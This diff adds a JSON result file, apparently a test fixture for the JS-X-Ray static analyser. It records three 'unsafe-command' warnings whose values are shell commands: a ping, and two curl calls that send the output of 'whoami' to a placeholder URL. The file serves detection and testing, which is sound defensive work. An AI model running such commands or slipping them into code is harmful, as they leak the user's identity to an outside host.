@@ -1,0 +1,63 @@
+{
+  "ok": true,
+  "warnings": [
+    {
+      "kind": "unsafe-command",
+      "location": [
+        [
+          2,
+          6
+        ],
+        [
+          2,
+          54
+        ]
+      ],
+      "source": "JS-X-Ray",
+      "i18n": "sast_warnings.unsafe_command",
+      "severity": "Warning",
+      "experimental": true,
+      "value": "ping -c 4 <URL>"
+    },
+    {
+      "kind": "unsafe-command",
+      "location": [
+        [
+          3,
+          6
+        ],
+        [
+          3,
+          74
+        ]
+      ],
+      "source": "JS-X-Ray",
+      "i18n": "sast_warnings.unsafe_command",
+      "severity": "Warning",
+      "experimental": true,
+      "value": "curl -X POST -d \"$(whoami)\" <URL>/c"
+    },
+    {
+      "kind": "unsafe-command",
+      "location": [
+        [
+          4,
+          6
+        ],
+        [
+          4,
+          68
+        ]
+      ],
+      "source": "JS-X-Ray",
+      "i18n": "sast_warnings.unsafe_command",
+      "severity": "Warning",
+      "experimental": true,
+      "value": "curl \"<URL>/c?user=$(whoami)\""
+    }
+  ],
+  "flags": [],
+  "idsLengthAvg": 0,
+  "stringScore": 0,
+  "dependencies": {}
+}
